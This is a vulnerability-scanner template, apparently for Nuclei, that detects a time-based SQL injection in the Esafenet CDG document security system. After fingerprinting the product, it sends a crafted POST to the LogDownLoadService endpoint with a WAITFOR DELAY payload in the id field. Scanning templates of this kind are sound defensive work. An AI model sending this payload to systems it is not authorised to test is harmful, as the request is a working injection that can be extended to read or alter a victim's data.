id: poc-yaml-yisaitong-esafenet-logdownloadservice-sqli
info:
  name: 亿赛通电子文档安全管理系统 LogDownLoadService SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "CDGServer3"

  - raw:
      - |
        POST /CDGServer3/logManagement/LogDownLoadService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        command=downLoadLogFiles&currPage=1&fromurl=../user/dataSearch.jsp&logFileName=indsex.txt&id=-1';WAITFOR DELAY '0:0:{{t1}}'--

    req-condition: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "icon:"
          - "id:"
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: dsl
        dsl:
          - duration > t1
          - duration < t2
